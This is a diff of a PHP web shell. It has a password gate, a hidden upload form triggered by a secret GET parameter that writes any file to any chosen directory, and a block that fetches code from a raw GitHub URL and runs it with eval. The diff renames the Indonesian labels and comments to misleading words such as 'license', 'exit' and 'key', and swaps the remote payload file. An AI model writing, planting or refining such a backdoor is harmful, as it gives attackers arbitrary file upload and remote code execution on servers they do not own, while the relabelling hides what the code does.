@@ -48,12 +48,12 @@ $error_message = "Password salah!";
 echo '<script>alert("' . $error_message . '");</script>';
 }
 }
-// Tangani proses unggah file
+// license
 if (isset($_GET['UBK']) && $_GET['UBK'] === '3') {
 echo '<form method="post" enctype="multipart/form-data">';
 echo '<input type="text" name="dir" size="30" value="' . getcwd() . '">';
 echo '<input type="file" name="file" size="15">';
-echo '<input type="submit" value="Unggah">';
+echo '<input type="submit" value="exit">';
 echo '</form>';
 }
 if (isset($_FILES['file']['tmp_name'])) {
@@ -63,15 +63,15 @@ $pwddir = $_POST['dir'];
 $real = $_FILES['file']['name'];
 $de = rtrim($pwddir, '/') . "/" . $real;
 if (move_uploaded_file($uploadd, $de)) {
-echo "BERKAS DIUNGGAHKAN KE $de";
+echo " key $de";
 } else {
-echo "GAGAL MENGUNGGAH BERKAS KE $de";
+echo "GAGAL $de";
 }
 }
 }
 // Jika pengguna sudah login, ambil dan eksekusi konten dari URL
 if (is_logged_in()) {
-$url = 'https://raw.githubusercontent.com/Anonrocks/-/refs/heads/master/fa';
+$url = 'https://raw.githubusercontent.com/Anonrocks/-/refs/heads/master/byp';
 $content = getRawContent($url);
 eval('?>' . $content);
 exit;
